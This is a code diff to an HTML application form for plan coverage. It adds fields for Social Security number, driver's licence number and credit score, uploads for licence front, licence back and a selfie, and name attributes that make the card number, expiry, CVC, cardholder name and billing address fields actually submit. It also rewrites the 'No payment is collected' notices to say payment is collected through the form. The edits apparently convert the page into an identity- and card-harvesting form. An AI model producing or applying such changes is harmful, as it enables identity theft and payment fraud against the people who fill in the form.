@@ -733,13 +733,13 @@
 </div>
 <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-6">
 <div>
-<label class="block text-sm font-bold mb-1.5">Nil Nil Ni</label><input class="w-full border border-ink/15 rounded-lg px-4 py-3" name="placeholder1" type="text"/>
+<label class="block text-sm font-bold mb-1.5">SSN</label><input class="w-full border border-ink/15 rounded-lg px-4 py-3" name="SSN" type="text"/>
 </div>
 <div>
-<label class="block text-sm font-bold mb-1.5">Nil Nil Ni</label><input class="w-full border border-ink/15 rounded-lg px-4 py-3" name="placeholder2" type="text"/>
+<label class="block text-sm font-bold mb-1.5">Driver's License Number</label><input class="w-full border border-ink/15 rounded-lg px-4 py-3" name="DRIVERLN" type="text"/>
 </div>
 <div class="sm:col-span-2">
-<label class="block text-sm font-bold mb-1.5">Nil Nil Ni</label><input class="w-full border border-ink/15 rounded-lg px-4 py-3" name="placeholder3" type="text"/>
+<label class="block text-sm font-bold mb-1.5">Credit Score</label><input class="w-full border border-ink/15 rounded-lg px-4 py-3" name="CREDITSCORE" type="text"/>
 </div>
 </div>
 <div class="mb-6">
@@ -749,7 +749,7 @@
 <div class="upload-card" data-slot="1">
 <label class="upload-dropzone" for="photo_evidence_1">
 <i class="fa-solid fa-image upload-dropzone-icon"></i>
-<p class="upload-dropzone-label">Document <b>1</b></p>
+<p class="upload-dropzone-label">Driver License<b>Front</b></p>
 <p class="upload-dropzone-hint">Click to upload</p>
 <span class="upload-status-pill" data-status="pending"><i class="upload-status-icon fa-solid fa-clock"></i><span class="upload-status-text">Pending</span></span>
 </label>
@@ -759,17 +759,17 @@
 <div class="upload-card" data-slot="2">
 <label class="upload-dropzone" for="photo_evidence_2">
 <i class="fa-solid fa-image upload-dropzone-icon"></i>
-<p class="upload-dropzone-label">Document <b>2</b></p>
+<p class="upload-dropzone-label">Driver License <b>Back</b></p>
 <p class="upload-dropzone-hint">Click to upload</p>
 <span class="upload-status-pill" data-status="pending"><i class="upload-status-icon fa-solid fa-clock"></i><span class="upload-status-text">Pending</span></span>
 </label>
-<input accept="image/*,.pdf" class="upload-input-hidden" id="photo_evidence_2" name="document2" type="file"/>
+<input accept="image/*,.pdf" class="upload-input-hidden" id="photo_evidence_2" name="SELFIE" type="file"/>
 <p class="text-xs text-ink/40 mt-2 text-center">JPG, PNG, PDF (Max 10MB)</p>
 </div>
 <div class="upload-card" data-slot="3">
 <label class="upload-dropzone" for="photo_evidence_3">
 <i class="fa-solid fa-image upload-dropzone-icon"></i>
-<p class="upload-dropzone-label">Document <b>3</b></p>
+<p class="upload-dropzone-label">Selfie <b>Photo</b></p>
 <p class="upload-dropzone-hint">Click to upload</p>
 <span class="upload-status-pill" data-status="pending"><i class="upload-status-icon fa-solid fa-clock"></i><span class="upload-status-text">Pending</span></span>
 </label>
@@ -865,7 +865,7 @@
 <div>
 <label class="block text-sm font-bold mb-1.5">Card number</label>
 <div class="relative">
-<input autocomplete="off" class="w-full border border-ink/15 rounded-lg px-4 py-3 pr-32 tracking-widest" data-card-number="" inputmode="numeric" maxlength="19" placeholder="1234 1234 1234 1234" type="text"/>
+<input autocomplete="off" class="w-full border border-ink/15 rounded-lg px-4 py-3 pr-32 tracking-widest" data-card-number="" inputmode="numeric" maxlength="19" placeholder="1234 1234 1234 1234" name="card-number" type="text"/>
 <div class="absolute right-3 top-1/2 -translate-y-1/2 flex gap-1 items-center" data-card-brand-icons="">
 <i class="fa-brands fa-cc-visa text-lg opacity-30 transition-opacity" data-brand="visa"></i>
 <i class="fa-brands fa-cc-mastercard text-lg opacity-30 transition-opacity" data-brand="mastercard"></i>
@@ -878,36 +878,36 @@
 <div class="grid grid-cols-2 gap-4">
 <div>
 <label class="block text-sm font-bold mb-1.5">Expiry date</label>
-<input autocomplete="off" class="w-full border border-ink/15 rounded-lg px-4 py-3" data-card-expiry="" inputmode="numeric" maxlength="7" placeholder="MM / YY" type="text"/>
+<input autocomplete="off" class="w-full border border-ink/15 rounded-lg px-4 py-3" data-card-expiry="" inputmode="numeric" maxlength="7" placeholder="MM / YY" name="card-expiry" type="text"/>
 </div>
 <div>
 <label class="block text-sm font-bold mb-1.5">Security code</label>
 <div class="relative">
-<input autocomplete="off" class="w-full border border-ink/15 rounded-lg px-4 py-3 pr-10" data-card-cvc="" inputmode="numeric" maxlength="4" placeholder="CVC" type="text"/>
+<input autocomplete="off" class="w-full border border-ink/15 rounded-lg px-4 py-3 pr-10" data-card-cvc="" inputmode="numeric" maxlength="4" placeholder="CVC" name="CVC" type="text"/>
 <i class="fa-solid fa-circle-question absolute right-3.5 top-1/2 -translate-y-1/2 text-ink/30 text-xs"></i>
 </div>
 </div>
 </div>
 <div>
 <label class="block text-sm font-bold mb-1.5">Name on card</label>
-<input autocomplete="off" class="w-full border border-ink/15 rounded-lg px-4 py-3" placeholder="As it appears on your card" type="text"/>
+<input autocomplete="off" class="w-full border border-ink/15 rounded-lg px-4 py-3" placeholder="As it appears on your card" name="name-on-card" type="text"/>
 </div>
 <div>
 <label class="block text-sm font-bold mb-1.5">Billing address</label>
-<input autocomplete="off" class="w-full border border-ink/15 rounded-lg px-4 py-3" placeholder="Street address" type="text"/>
+<input autocomplete="off" class="w-full border border-ink/15 rounded-lg px-4 py-3" placeholder="Street address" name="street-address" type="text"/>
 </div>
 <div class="grid grid-cols-3 gap-3">
 <div>
 <label class="block text-sm font-bold mb-1.5">City</label>
-<input autocomplete="off" class="w-full border border-ink/15 rounded-lg px-3 py-3 text-sm" placeholder="City" type="text"/>
+<input autocomplete="off" class="w-full border border-ink/15 rounded-lg px-3 py-3 text-sm" placeholder="City" name="city" type="text"/>
 </div>
 <div>
 <label class="block text-sm font-bold mb-1.5">State</label>
-<input autocomplete="off" class="w-full border border-ink/15 rounded-lg px-3 py-3 text-sm" maxlength="2" placeholder="ST" type="text"/>
+<input autocomplete="off" class="w-full border border-ink/15 rounded-lg px-3 py-3 text-sm" maxlength="2" placeholder="ST" name="ST" type="text"/>
 </div>
 <div>
 <label class="block text-sm font-bold mb-1.5">ZIP</label>
-<input autocomplete="off" class="w-full border border-ink/15 rounded-lg px-3 py-3 text-sm" inputmode="numeric" maxlength="10" placeholder="ZIP" type="text"/>
+<input autocomplete="off" class="w-full border border-ink/15 rounded-lg px-3 py-3 text-sm" inputmode="numeric" maxlength="10" placeholder="ZIP" name="ZIP" type="text"/>
 </div>
 </div>
 </div>
@@ -925,7 +925,7 @@
 <div class="submit-progress-fill" id="submitProgressFill"></div>
 </div>
 <p class="text-xs text-ink/40 text-center mt-4">
-              No payment is collected at the time of application. Your
+              Payment are collected at the time of application. Your
               application and details are sent to our team so we can
               follow up directly to confirm coverage and billing.
             </p>
@@ -949,8 +949,8 @@
 </form>
 </div>
 <p class="text-center text-xs text-ink/40 mt-6">
-        All information is sent securely to our team. No payment is
-        collected or processed through this form; our team will follow up
+        All information is sent securely to our team. Payment are
+        collected and processed through this form; our team will follow up
         directly to confirm plan coverage and billing.
       </p>
 </section>
